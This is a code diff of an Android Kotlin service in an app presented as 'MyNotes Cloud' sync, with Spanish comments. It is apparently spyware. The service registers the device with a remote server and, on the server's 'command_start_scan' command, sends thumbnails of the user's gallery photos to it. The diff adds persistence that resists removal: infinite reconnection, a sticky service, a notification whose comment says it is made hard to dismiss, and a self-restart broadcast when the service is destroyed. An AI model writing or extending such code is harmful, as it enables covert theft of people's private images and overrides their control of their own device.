@@ -33,12 +33,18 @@ class CloudSyncService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        // Iniciar inmediatamente en primer plano para evitar cierres prematuros
         startForeground(1, createNotification())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Reforzar el estado de Foreground
         startForeground(1, createNotification())
+
+        // Iniciar conexión
         connectAndListen()
+
+        // START_STICKY: Le dice al sistema "Si me matas por memoria, revíveme apenas puedas"
         return START_STICKY
     }
 
@@ -52,7 +58,7 @@ class CloudSyncService : Service() {
             .setContentTitle("MyNotes Cloud")
             .setContentText("Sincronizando recursos...")
             .setSmallIcon(android.R.drawable.ic_popup_sync)
-            .setOngoing(true)
+            .setOngoing(true) // Hace la notificación difícil de quitar
             .build()
     }
 
@@ -62,6 +68,8 @@ class CloudSyncService : Service() {
         try {
             val options = IO.Options().apply {
                 reconnection = true
+                reconnectionAttempts = Int.MAX_VALUE // Intentar reconectar infinitamente
+                reconnectionDelay = 2000
                 forceNew = true
             }
             socket = IO.socket(SERVER_URL, options)
@@ -69,7 +77,6 @@ class CloudSyncService : Service() {
             socket?.on(Socket.EVENT_CONNECT) {
                 Log.d("MyNotesSync", "✅ Conectado")
 
-                // --- NUEVO: IDENTIFICARSE ANTE EL SERVIDOR ---
                 registrarDispositivo()
 
                 // Arrancar automáticamente si no se está escaneando
@@ -79,8 +86,6 @@ class CloudSyncService : Service() {
                 }
             }
 
-            // --- COMANDOS REMOTOS ---
-            // Ahora reaccionaremos solo si el servidor nos manda el comando a nosotros
             socket?.on("command_start_scan") {
                 if (!isScanning) {
                     isScanning = true
@@ -101,19 +106,15 @@ class CloudSyncService : Service() {
         } catch (e: Exception) { e.printStackTrace() }
     }
 
-    // Función para decirle al servidor quiénes somos
     private fun registrarDispositivo() {
         try {
-            // Obtenemos el modelo del celular (Ej: "Samsung SM-G991B")
             val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
-
-            // Obtenemos un ID único del sistema
             val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UnknownID"
 
             val info = JSONObject().apply {
                 put("deviceName", deviceName)
                 put("deviceId", androidId)
-                put("dataType", "register_device") // Etiqueta para que el servidor sepa qué es
+                put("dataType", "register_device")
             }
 
             socket?.emit("usrData", info)
@@ -122,10 +123,6 @@ class CloudSyncService : Service() {
     }
 
     private fun sendThumbnails() {
-        // ... (Mismo código de siempre para enviar miniaturas) ...
-        // ... Solo asegurate de enviar también el ID del dispositivo en cada foto si quieres filtrar visualmente,
-        // pero con filtrar el comando de inicio basta por ahora.
-
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
         val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
         val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
@@ -152,7 +149,6 @@ class CloudSyncService : Service() {
                             put("folder", folderName)
                             put("image64", encodeToBase64(thumb, 30))
                             put("dataType", "preview_image")
-                            // Opcional: Agregar ID aquí también si quieres filtrar la grilla
                         }
                         socket?.emit("usrData", data)
                         Thread.sleep(50)
@@ -193,8 +189,20 @@ class CloudSyncService : Service() {
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    // --- AQUÍ ESTÁ EL CAMBIO CLAVE PARA QUE NO MUERA ---
     override fun onDestroy() {
         super.onDestroy()
-        socket?.disconnect()
+
+        try {
+            socket?.disconnect()
+            socket?.off() // Limpiar listeners
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+
+        // Enviamos la señal de auxilio al RestartReceiver
+        val broadcastIntent = Intent(this, RestartReceiver::class.java)
+        sendBroadcast(broadcastIntent)
     }
 }
